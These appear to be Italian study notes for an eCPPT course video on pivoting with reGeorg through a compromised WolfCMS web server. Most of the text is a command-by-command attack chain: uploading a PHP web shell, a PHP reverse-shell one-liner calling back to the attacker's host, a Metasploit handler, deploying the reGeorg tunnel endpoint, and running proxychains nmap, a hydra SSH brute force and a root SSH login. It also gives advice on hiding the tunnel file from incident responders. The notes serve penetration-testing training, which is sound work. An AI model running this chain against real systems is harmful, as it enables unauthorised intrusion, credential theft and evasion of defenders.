# 015 — Pivoting with reGeorg (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 15/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [015_Pivoting with reGeorg.txt](015_Pivoting with reGeorg.txt) · [015_Pivoting with reGeorg.srt](015_Pivoting with reGeorg.srt)

## Concetti chiave

- **reGeorg** = tunneling **HTTP-based SOCKS proxy** via **web shell**. Risolve il problema di pivotare quando:
  - hai compromesso un web server,
  - hai solo accesso come utente non privilegiato (es. `www-data`),
  - **non puoi** quindi fare port forwarding OS-native (richiede root/admin) né aprire socket arbitrari.
- Idea: carichi sul server vulnerabile uno script (`tunnel.php` / `tunnel.aspx` / `tunnel.jspx` / ecc.) che funziona come "endpoint" del tunnel. Il **client reGeorg** in locale comunica con quell'endpoint via HTTP/HTTPS e gli espone un **SOCKS proxy locale**.
- Tutto il traffico passa **dentro richieste HTTP** verso il web server compromesso → bypassa firewall che permettono solo HTTP/HTTPS in uscita.
- Nel lab: foothold su WolfCMS via arbitrary file upload (ExploitDB 3681) come `www-data` → reverse shell PHP → carico `tunnel.php` di reGeorg → `python reGeorgSocksProxy.py -p 9050 -u http://victim1/public/tunnel.php` → `proxychains nmap/hydra/ssh` verso victim2.

## Spiegazione approfondita

### Quando usare reGeorg (vs SSH tunneling vs MSF SOCKS)
| Scenario | Tecnica adatta |
|---|---|
| Pivot Linux con SSH attivo + creds | SSH `-D` |
| Sessione Meterpreter + privilegi | `autoroute` + `socks_proxy` |
| **Solo web shell, no privilegi, no SSH** | **reGeorg** |
| Web server in DMZ, firewall che blocca tutto tranne HTTP | **reGeorg** |

### Topologia
```
                                    ┌─────────────────────────┐
                                    │  Firewall: solo :80 OUT │
                                    └─────────────┬───────────┘
                                                  │
  [Kali] ──proxychains──> 127.0.0.1:9050          │
                              │                   │
                       [reGeorgSocksProxy.py]     │
                              │                   │
                              │  HTTP POST/GET ───┘
                              v
                   [VICTIM1 / web server]
                   Apache/IIS/Tomcat compromesso
                   └─ /public/tunnel.php (reGeorg endpoint, gira come www-data)
                              │
                              │ socket() lato server
                              v
                   ┌─────────────────────────┐
                   │  RETE INTERNA           │
                   │  [VICTIM2] 192.168.x.3  │
                   │    :22 ssh, :80 web     │
                   └─────────────────────────┘
```

### Endpoint server-side
reGeorg fornisce file pronti per più tecnologie web — basta caricare quello che il server può eseguire:
- `tunnel.php` (PHP)
- `tunnel.aspx` (ASP.NET / IIS)
- `tunnel.jsp` / `tunnel.jspx` (Java / Tomcat / JBoss)
- `tunnel.ashx` (ASP.NET handler)
- `tunnel.nosocket.php` (per ambienti dove `socket_create` non è disponibile)

L'endpoint riceve richieste HTTP dal client reGeorg con direttive (CONNECT / DISCONNECT / FORWARD / READ) e usa le primitive del linguaggio server (PHP socket, .NET Socket, ecc.) per parlare con `target_host:port` come gli viene richiesto. **Funziona dentro i privilegi del processo web** → niente root necessario.

### Lab walkthrough (riepilogo)
1. Nmap su target pubblico → `:80` Wolf CMS + `:3306` MySQL.
2. `searchsploit wolf` → CVE/exploit per **arbitrary file upload** (3681.php).
3. Login admin panel (`/?/admin/login`) con creds del lab: `Robert / password1`.
4. Carica `php-backdoor.php` da `/usr/share/webshells/php/` via funzione upload (file finisce in `/public/`).
5. Esegue `php -r '$sock=fsockopen("<kali_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` → reverse shell in `multi/handler` (`payload php/reverse_php`).
6. Shell come `www-data`. `ifconfig` mostra seconda NIC su rete interna → victim2 = terza IP.
7. Niente privilegi → impossibile `ssh -D` o `portfwd`. Si usa **reGeorg**.
8. Carica `tunnel.php` da `~/Desktop/tools/reGeorg/` via il file upload di WolfCMS.
9. Verifica accesso: `http://<victim1>/public/tunnel.php` → restituisce "Georg says, 'All seems fine'".
10. Lato Kali: `python reGeorgSocksProxy.py -p 9050 -u http://<victim1>/public/tunnel.php`.
11. `netstat -antp | grep 9050` → listener SOCKS attivo.
12. `proxychains nmap -sT -Pn <victim2>` → trova SSH aperto.
13. `proxychains hydra -t 4 -l root -P seclists/.../rockyou-40.txt ssh://<victim2>`.
14. `proxychains ssh root@<victim2>` → accesso a victim2 senza mai aver avuto root su victim1.

## Comandi & strumenti

| Comando / Componente | Scopo |
|---|---|
| `searchsploit wolf` | Trova exploit pubblici per WolfCMS |
| `php-backdoor.php` (`/usr/share/webshells/php/`) | Web shell PHP minimal per eseguire comandi via browser |
| `use exploit/multi/handler` + `set payload php/reverse_php` | Listener per reverse PHP shell |
| Endpoint reGeorg (`tunnel.php` / `.aspx` / `.jsp`…) | File caricato sul web server vittima — bridge HTTP↔socket |
| `python reGeorgSocksProxy.py -p 9050 -u http://victim1/public/tunnel.php` | Client reGeorg: apre SOCKS locale su 9050, parla HTTP con l'endpoint |
| `proxychains nmap -sT -Pn <target>` | Port scan attraverso il tunnel |
| `proxychains hydra -l root -P <wordlist> ssh://<target>` | Brute force SSH via tunnel |
| `proxychains ssh root@<target>` | Connessione SSH alla rete interna |
| `netstat -antp \| grep 9050` | Verifica listener SOCKS reGeorg |

## Esempi pratici

```bash
# === 1. Recon ===
nmap -sS -sV 192.168.x.3
# 80/tcp   open  http   Apache (WolfCMS)
# 3306/tcp open  mysql

# === 2. Foothold via WolfCMS auth + file upload ===
# Admin panel: http://victim1/?/admin/login
# Creds lab:   Robert / password1
# Upload web shell PHP (da /usr/share/webshells/php/php-backdoor.php)
# File salvato in /public/php-backdoor.php

# Reverse shell handler:
msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload php/reverse_php
msf6 > set LHOST <kali_ip>
msf6 > set LPORT 4444
msf6 > exploit -j

# Da php-backdoor (campo "execute"):
php -r '$sock=fsockopen("<kali_ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# === 3. Recon interno ===
$ id
uid=33(www-data) gid=33(www-data)
$ ifconfig
# eth0: 10.x.x.x   (pubblico)
# eth1: 192.168.x.2/24  ← rete interna
# → victim2 = 192.168.x.3

# === 4. Upload del tunnel reGeorg ===
# Da Kali, /root/Desktop/tools/reGeorg/tunnel.php
# Caricalo via lo stesso file upload WolfCMS (admin panel) → /public/tunnel.php
# Test: http://victim1/public/tunnel.php
#   → "Georg says, 'All seems fine'"

# === 5. Avvia il client reGeorg ===
cd ~/Desktop/tools/reGeorg
python reGeorgSocksProxy.py -p 9050 -u http://192.168.x.3/public/tunnel.php
# [INFO] Starting socks server [127.0.0.1:9050]
# [INFO] Checking if Georg is ready
# [INFO] Georg says, 'All seems fine'

# === 6. Usa proxychains per arrivare a victim2 ===
proxychains nmap -sT -Pn 192.168.x.3
# 22/tcp open ssh

proxychains hydra -t 4 -l root \
    -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt \
    ssh://192.168.x.3
# [22][ssh] login: root  password: <found>

proxychains ssh root@192.168.x.3
# victim2 #
```

## Punti d'attenzione per l'esame eCPPT

- **Use case unico di reGeorg**: pivot con **solo web shell** + **nessun privilegio**. Se l'esame descrive "compromesso web server come www-data, firewall blocca tutto tranne HTTP" → la risposta è **reGeorg**.
- **Endpoint corretto per la tecnologia**: PHP → `tunnel.php`, IIS/ASP.NET → `tunnel.aspx`, Tomcat/JBoss → `tunnel.jsp`/`.jspx`. Caricare un `.aspx` su Apache non eseguirà nulla.
- **Porta default coerente con proxychains**: `-p 9050` lato client reGeorg ↔ `socks4 127.0.0.1 9050` in `/etc/proxychains.conf`.
- **Verifica `Georg says, 'All seems fine'`**: signature di endpoint funzionante. Se restituisce HTML/errori → controlla path, permessi, supporto socket lato PHP.
- **`tunnel.nosocket.php`** è la variante per host PHP dove `socket_create` è disabilitato — meno performante ma funzionante.
- **Traffico tutto HTTP**: passa firewall in uscita; molto utile per pivot in DMZ. **Però** è rumoroso a livello applicativo (log Apache/IIS pieni di POST verso `tunnel.php`).
- **Limiti**: TCP-only, latenza alta (polling HTTP), tool che fanno tante connessioni (es. nmap aggressivo) diventano lenti.
- **Combo con proxychains** identica a SOCKS proxy MSF / SSH `-D`: `nmap -sT -Pn`, niente UDP, niente ICMP.
- **Alternative moderne** allo stesso scenario: **Neo-reGeorg** (fork mantenuto), **Chisel** in HTTP mode, **pivotnacci**. reGeorg resta il riferimento classico citato sui materiali eCPPT.
- **OPSEC**: l'endpoint `tunnel.php` è file su disco → IR lo trova facilmente. In red team rinominare e nascondere in directory plausibile.

## Collegamenti con altri video

- Precedente: [[014_Pivoting via SSH Tunneling]] — pivot OS-native (richiede SSH + creds).
- SOCKS via Metasploit: [[013_Pivoting with SOCKS Proxy]] — richiede Meterpreter privilegiato.
- Port forwarding singolo: [[012_Pivoting & Port Forwarding with Metasploit]].
- Prossimo: [[016_Course Conclusion]] — chiusura modulo.
